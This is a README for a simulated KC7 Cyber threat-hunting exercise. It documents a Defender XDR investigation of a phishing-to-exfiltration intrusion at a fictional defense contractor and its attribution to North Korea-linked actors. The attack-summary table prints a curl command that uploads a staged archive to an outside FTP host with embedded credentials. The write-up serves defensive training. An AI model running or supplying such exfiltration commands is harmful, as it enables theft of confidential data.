# Defender-XDR-Hunting-NorthKorean-Threat-Actors
Uncovering North Korean Threat Actors with Microsoft Defender XDR  Full-scale investigation and attribution of **Moonstone Sleet** (North Korea-linked) and **Crimson Sandstorm** using Microsoft Defender XDR Advanced Hunting.

<br>

> **Platform:** KC7 Cyber (sponsored by Microsoft)
> **Tools used:** Microsoft Defender XDR · Advanced Hunting (KQL) · Defender Threat Intelligence · Passive DNS
> **Threat actors identified:** Moonstone Sleet · Crimson Sandstorm (Curium)
> **Status:** Investigation complete

---

## Overview

TitanShield is a defense contractor running a classified program called **Project Omega**. This case documents a full investigation into a multi-stage intrusion — from the initial LinkedIn reconnaissance through phishing delivery, malware execution, lateral spread across 15 hosts, and confirmed data exfiltration.

The investigation was conducted entirely inside the **Microsoft Defender XDR** portal using Advanced Hunting KQL queries across six data tables. Two separate nation-state threat actors were identified and attributed using Defender Threat Intelligence and Passive DNS pivoting.

---

## Attack summary

| Stage | What happened |
|---|---|
| Reconnaissance | Threat actor IPs scanned the company from Jul 5 — targeting employees via LinkedIn |
| Initial access | Phishing email with malicious Excel file delivered to Defense Engineers |
| Execution | Macro in `New_Diet_Plan_For_My_Love.xlsx` dropped `macro.xlsm` → spawned recon commands |
| Discovery | 39 commands logging system info to `%temp%\Logs.txt` on Taylor's machine |
| Lateral movement | Same command pattern found across **15 distinct hosts** |
| Collection | Project Omega files staged: `\\company_share\confidential\defense\project_omega\*` → `C:\StagingArea\*` → `TopSecret.zip` |
| Exfiltration | `curl -T TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass` |
| Second vector | Separate Moonstone Sleet campaign via `detankwar.com` targeting game-playing Defense Engineers |

---

## Repository structure

```
titan-shield/
│
├── README.md ← you are here
│
├── queries/
│ ├── 01_initial_access.kql ← phishing + file delivery
│ ├── 02_execution_discovery.kql ← macro, recon commands, lateral spread
│ ├── 03_collection_exfiltration.kql ← staging, compression, C2 exfil
│ ├── 04_threat_actor_attribution.kql ← passive DNS, IOC pivoting
│ └── 05_moonstone_sleet_campaign.kql ← second vector investigation
│
├── report/
│ └── incident_report.md ← full written investigation narrative
│
└── screenshots/
└── README.md ← screenshot index with descriptions
```

---

## Key KQL techniques demonstrated

- `join kind=inner` across `Email` and `Employees` tables to map phishing targets to job roles
- `let` variable + `in` operator to pivot from attacker emails → domains → Passive DNS → IPs → inbound recon
- `has_all()` chaining to fingerprint a specific command pattern and find 663 matching events
- `parse_url().Host` to extract domains from raw links for threat intelligence lookup
- `order by timestamp desc` pivoting around a known malicious timestamp to reconstruct the kill chain

---

## Threat actor attribution

### Moonstone Sleet
- Linked to: `detankwar.com`, `NVUnityPlugin.dll` (hash `09d152aa...`), `DeTankWar.zip` (hash `56554117...`)
- Vector: fake tank game distributed via phishing to Defense Engineers
- Attribution confirmed via: Defender XDR Threat Intelligence file hash lookup

### Crimson Sandstorm (Curium)
- Linked to: 3 domains extracted from `marcella_flores@gmail.com` phishing emails
- Infrastructure: 2 IPs resolved via Passive DNS (`208.199.30.154`, `202.241.233.180`)
- Pre-attack recon: 47 inbound requests from actor IPs beginning 2024-07-05
- Exfiltrated data sent to: `exfilbucket93@gmail.com`
- Attribution confirmed via: Defender XDR Intel Explorer domain lookup

---

## What I would do differently in a real SOC

- **Create a custom detection rule** in Defender XDR Advanced Hunting for the FTP exfiltration pattern: any process running `curl -T` with an FTP destination and hardcoded credentials should trigger a High severity alert immediately.
- **Escalate the `whoami` alert sooner.** The EDR alert on Taylor's machine was treated as low-fidelity. The surrounding context (39 recon commands, ping to `yandex.com`, `wmic product get`) should have raised it to Medium within minutes of the first pivot.
- **Add the 2 attacker IPs as custom IOC indicators** (Block + Alert) in `Settings → Endpoints → Rules → Indicators` the moment Passive DNS resolved them — stopping the recon loop and any future connections.
- **Notify HR and Legal** when the LinkedIn recon pattern was confirmed — employees in targeted roles (Defense Engineers) should have received a phishing awareness alert before the malicious emails landed.

---

## Skills demonstrated

`KQL` · `Microsoft Defender XDR` · `Threat Intelligence` · `Passive DNS` · `Kill chain analysis` · `Threat actor attribution` · `Incident investigation` · `Data exfiltration detection` · `Phishing analysis` · `MITRE ATT&CK mapping`

---

## Platform

[KC7 Cyber](https://kc7cyber.com) — Titan Shield module (Microsoft-sponsored)

*This investigation was conducted in a simulated environment on the KC7 Cyber platform. No real systems were accessed.*
